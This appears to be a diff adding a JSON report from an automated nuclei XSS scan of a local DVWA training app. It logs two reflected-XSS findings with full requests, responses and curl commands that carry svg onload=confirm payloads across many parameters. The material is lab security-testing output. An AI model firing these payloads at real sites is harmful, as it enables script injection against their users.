@@ -1,0 +1,123 @@
+{
+  "meta": {
+    "tool": "nuclei_xss_agent",
+    "version": "1.1",
+    "started_at_unix": 1770316753,
+    "duration_seconds": 15.96,
+    "targets_total": 1,
+    "targets_scanned": 1,
+    "targets_blocked": 0,
+    "nuclei_templates_root": "/home/korea/nuclei-templates",
+    "nuclei_tags": "xss"
+  },
+  "raw_outputs": {},
+  "status": "vulnerable",
+  "findings": [
+    {
+      "tool": "nuclei",
+      "name": "Fuzzing Parameters - Cross-Site Scripting",
+      "severity": "medium",
+      "url": "http://localhost/vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E",
+      "evidence": null,
+      "raw": {
+        "template": "http/vulnerabilities/generic/xss-fuzz.yaml",
+        "template-url": "https://cloud.projectdiscovery.io/public/xss-fuzz",
+        "template-id": "xss-fuzz",
+        "template-path": "/home/korea/nuclei-templates/http/vulnerabilities/generic/xss-fuzz.yaml",
+        "info": {
+          "name": "Fuzzing Parameters - Cross-Site Scripting",
+          "author": [
+            "kazet"
+          ],
+          "tags": [
+            "xss",
+            "generic",
+            "vuln"
+          ],
+          "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+          "severity": "medium",
+          "metadata": {
+            "max-request": 29,
+            "parameters": "q,s,search,id,action,keyword,query,page,keywords,url,view,cat,name,key,p,month,page_id,password,terms,token,type,unsubscribe_token,api,api_key,begindate,callback,categoryid,csrf_token,email,emailto,enddate,immagine,item,jsonp,l,lang,list_type,year"
+          },
+          "classification": {
+            "cve-id": null,
+            "cwe-id": [
+              "cwe-79"
+            ]
+          }
+        },
+        "type": "http",
+        "host": "localhost",
+        "port": "80",
+        "scheme": "http",
+        "url": "http://localhost/vulnerabilities/xss_r/?name=test",
+        "path": "/vulnerabilities/xss_r/",
+        "matched-at": "http://localhost/vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E",
+        "request": "GET /vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAccept: */*\r\nAccept-Language: en\r\nCookie: security=high; PHPSESSID=0pg4olkh64e8ghjsu01l6f7r12\r\nAccept-Encoding: gzip\r\n\r\n",
+        "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nCache-Control: no-cache, must-revalidate\r\nContent-Type: text/html;charset=utf-8\r\nDate: Thu, 05 Feb 2026 18:39:18 GMT\r\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\r\nPragma: no-cache\r\nServer: Apache/2.4.25 (Debian)\r\nVary: Accept-Encoding\r\nX-Xss-Protection: 0\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r\n\r\n\t\t<script type=\"text/javascript\" src=\"../../dvwa/js/dvwaPage.js\"></script>\r\n\r\n\t</head>\r\n\r\n\t<body class=\"home\">\r\n\t\t<div id=\"container\">\r\n\r\n\t\t\t<div id=\"header\">\r\n\r\n\t\t\t\t<img src=\"../../dvwa/images/logo.png\" alt=\"Damn Vulnerable Web Application\" />\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_menu\">\r\n\r\n\t\t\t\t<div id=\"main_menu_padded\">\r\n\t\t\t\t<ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../.\">Home</a></li>\n<li class=\"\"><a href=\"../../instructions.php\">Instructions</a></li>\n<li class=\"\"><a href=\"../../setup.php\">Setup / Reset DB</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../vulnerabilities/brute/\">Brute Force</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/exec/\">Command Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csrf/\">CSRF</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/fi/.?page=include.php\">File Inclusion</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/upload/\">File Upload</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/captcha/\">Insecure CAPTCHA</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/sqli/\">SQL Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/sqli_blind/\">SQL Injection (Blind)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/weak_id/\">Weak Session IDs</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_d/\">XSS (DOM)</a></li>\n<li class=\"selected\"><a href=\"../../vulnerabilities/xss_r/\">XSS (Reflected)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_s/\">XSS (Stored)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csp/\">CSP Bypass</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/javascript/\">JavaScript</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../security.php\">DVWA Security</a></li>\n<li class=\"\"><a href=\"../../phpinfo.php\">PHP Info</a></li>\n<li class=\"\"><a href=\"../../about.php\">About</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../logout.php\">Logout</a></li>\n</ul>\r\n\t\t\t\t</div>\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_body\">\r\n\r\n\t\t\t\t\r\n<div class=\"body_padded\">\r\n\t<h1>Vulnerability: Reflected Cross Site Scripting (XSS)</h1>\r\n\r\n\t<div class=\"vulnerable_code_area\">\r\n\t\t<form name=\"XSS\" action=\"#\" method=\"GET\">\r\n\t\t\t<p>\r\n\t\t\t\tWhat's your name?\r\n\t\t\t\t<input type=\"text\" name=\"name\">\r\n\t\t\t\t<input type=\"submit\" value=\"Submit\">\r\n\t\t\t</p>\n\r\n\t\t</form>\r\n\t\t<pre>Hello '>\"<svg/onload=confirm('xss-name')></pre>\r\n\t</div>\r\n\r\n\t<h2>More Information</h2>\r\n\t<ul>\r\n\t\t<li><a href=\"https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)\" target=\"_blank\">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>\r\n\t\t<li><a href=\"https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\" target=\"_blank\">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li>\r\n\t\t<li><a href=\"https://en.wikipedia.org/wiki/Cross-site_scripting\" target=\"_blank\">https://en.wikipedia.org/wiki/Cross-site_scripting</a></li>\r\n\t\t<li><a href=\"http://www.cgisecurity.com/xss-faq.html\" target=\"_blank\">http://www.cgisecurity.com/xss-faq.html</a></li>\r\n\t\t<li><a href=\"http://www.scriptalert1.com/\" target=\"_blank\">http://www.scriptalert1.com/</a></li>\r\n\t</ul>\r\n</div>\n\r\n\t\t\t\t<br /><br />\r\n\t\t\t\t\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div class=\"clear\">\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"system_info\">\r\n\t\t\t\t<input type=\"button\" value=\"View Help\" class=\"popup_button\" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=xss_r&security=high' )\"> <input type=\"button\" value=\"View Source\" class=\"popup_button\" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=xss_r&security=high' )\"> <div align=\"left\"><em>Username:</em> admin<br /><em>Security Level:</em> high<br /><em>PHPIDS:</em> disabled</div>\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"footer\">\r\n\r\n\t\t\t\t<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>\r\n\t\t\t\t<script src='/dvwa/js/add_event_listeners.js'></script>\r\n\r\n\t\t\t</div>\r\n\r\n\t\t</div>\r\n\r\n\t</body>\r\n\r\n</html>",
+        "meta": {
+          "xss_param": "name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E"
+        },
+        "ip": "127.0.0.1",
+        "timestamp": "2026-02-05T20:39:18.617706752+02:00",
+        "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: security=high; PHPSESSID=0pg4olkh64e8ghjsu01l6f7r12' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0' 'http://localhost/vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E'",
+        "matcher-status": true
+      },
+      "finding_id": "3eb0ac3e5ff27861"
+    },
+    {
+      "tool": "nuclei",
+      "name": "Top 38 Parameters - Cross-Site Scripting",
+      "severity": "high",
+      "url": "http://localhost/vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E",
+      "evidence": null,
+      "raw": {
+        "template": "http/vulnerabilities/generic/top-xss-params.yaml",
+        "template-url": "https://cloud.projectdiscovery.io/public/top-xss-params",
+        "template-id": "top-xss-params",
+        "template-path": "/home/korea/nuclei-templates/http/vulnerabilities/generic/top-xss-params.yaml",
+        "info": {
+          "name": "Top 38 Parameters - Cross-Site Scripting",
+          "author": [
+            "foulenzer",
+            "geeknik"
+          ],
+          "tags": [
+            "xss",
+            "generic",
+            "vuln"
+          ],
+          "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.",
+          "severity": "high",
+          "metadata": {
+            "max-request": 3,
+            "parameters": "q,s,search,id,action,keyword,query,page,keywords,url,view,cat,name,key,p,month,page_id,password,terms,token,type,unsubscribe_token,api,api_key,begindate,callback,categoryid,csrf_token,email,emailto,enddate,immagine,item,jsonp,l,lang,list_type,year"
+          },
+          "classification": {
+            "cve-id": null,
+            "cwe-id": [
+              "cwe-79"
+            ],
+            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+            "cvss-score": 7.2
+          }
+        },
+        "type": "http",
+        "host": "localhost",
+        "port": "80",
+        "scheme": "http",
+        "url": "http://localhost/vulnerabilities/xss_r/?name=test",
+        "path": "/vulnerabilities/xss_r/",
+        "matched-at": "http://localhost/vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E",
+        "request": "GET /vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nCookie: security=high; PHPSESSID=0pg4olkh64e8ghjsu01l6f7r12\r\nAccept-Encoding: gzip\r\n\r\n",
+        "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nCache-Control: no-cache, must-revalidate\r\nContent-Type: text/html;charset=utf-8\r\nDate: Thu, 05 Feb 2026 18:39:21 GMT\r\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\r\nPragma: no-cache\r\nServer: Apache/2.4.25 (Debian)\r\nVary: Accept-Encoding\r\nX-Xss-Protection: 0\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r\n\r\n\t\t<script type=\"text/javascript\" src=\"../../dvwa/js/dvwaPage.js\"></script>\r\n\r\n\t</head>\r\n\r\n\t<body class=\"home\">\r\n\t\t<div id=\"container\">\r\n\r\n\t\t\t<div id=\"header\">\r\n\r\n\t\t\t\t<img src=\"../../dvwa/images/logo.png\" alt=\"Damn Vulnerable Web Application\" />\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_menu\">\r\n\r\n\t\t\t\t<div id=\"main_menu_padded\">\r\n\t\t\t\t<ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../.\">Home</a></li>\n<li class=\"\"><a href=\"../../instructions.php\">Instructions</a></li>\n<li class=\"\"><a href=\"../../setup.php\">Setup / Reset DB</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../vulnerabilities/brute/\">Brute Force</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/exec/\">Command Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csrf/\">CSRF</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/fi/.?page=include.php\">File Inclusion</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/upload/\">File Upload</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/captcha/\">Insecure CAPTCHA</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/sqli/\">SQL Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/sqli_blind/\">SQL Injection (Blind)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/weak_id/\">Weak Session IDs</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_d/\">XSS (DOM)</a></li>\n<li class=\"selected\"><a href=\"../../vulnerabilities/xss_r/\">XSS (Reflected)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_s/\">XSS (Stored)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csp/\">CSP Bypass</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/javascript/\">JavaScript</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../security.php\">DVWA Security</a></li>\n<li class=\"\"><a href=\"../../phpinfo.php\">PHP Info</a></li>\n<li class=\"\"><a href=\"../../about.php\">About</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../logout.php\">Logout</a></li>\n</ul>\r\n\t\t\t\t</div>\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_body\">\r\n\r\n\t\t\t\t\r\n<div class=\"body_padded\">\r\n\t<h1>Vulnerability: Reflected Cross Site Scripting (XSS)</h1>\r\n\r\n\t<div class=\"vulnerable_code_area\">\r\n\t\t<form name=\"XSS\" action=\"#\" method=\"GET\">\r\n\t\t\t<p>\r\n\t\t\t\tWhat's your name?\r\n\t\t\t\t<input type=\"text\" name=\"name\">\r\n\t\t\t\t<input type=\"submit\" value=\"Submit\">\r\n\t\t\t</p>\n\r\n\t\t</form>\r\n\t\t<pre>Hello '>\"<svg/onload=confirm('name')></pre>\r\n\t</div>\r\n\r\n\t<h2>More Information</h2>\r\n\t<ul>\r\n\t\t<li><a href=\"https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)\" target=\"_blank\">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>\r\n\t\t<li><a href=\"https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\" target=\"_blank\">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li>\r\n\t\t<li><a href=\"https://en.wikipedia.org/wiki/Cross-site_scripting\" target=\"_blank\">https://en.wikipedia.org/wiki/Cross-site_scripting</a></li>\r\n\t\t<li><a href=\"http://www.cgisecurity.com/xss-faq.html\" target=\"_blank\">http://www.cgisecurity.com/xss-faq.html</a></li>\r\n\t\t<li><a href=\"http://www.scriptalert1.com/\" target=\"_blank\">http://www.scriptalert1.com/</a></li>\r\n\t</ul>\r\n</div>\n\r\n\t\t\t\t<br /><br />\r\n\t\t\t\t\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div class=\"clear\">\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"system_info\">\r\n\t\t\t\t<input type=\"button\" value=\"View Help\" class=\"popup_button\" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=xss_r&security=high' )\"> <input type=\"button\" value=\"View Source\" class=\"popup_button\" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=xss_r&security=high' )\"> <div align=\"left\"><em>Username:</em> admin<br /><em>Security Level:</em> high<br /><em>PHPIDS:</em> disabled</div>\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"footer\">\r\n\r\n\t\t\t\t<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>\r\n\t\t\t\t<script src='/dvwa/js/add_event_listeners.js'></script>\r\n\r\n\t\t\t</div>\r\n\r\n\t\t</div>\r\n\r\n\t</body>\r\n\r\n</html>",
+        "ip": "127.0.0.1",
+        "timestamp": "2026-02-05T20:39:21.609098921+02:00",
+        "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: security=high; PHPSESSID=0pg4olkh64e8ghjsu01l6f7r12' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15' 'http://localhost/vulnerabilities/xss_r/?name=test&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E'",
+        "matcher-status": true
+      },
+      "finding_id": "4a50c578e391fb2d"
+    }
+  ]
+}
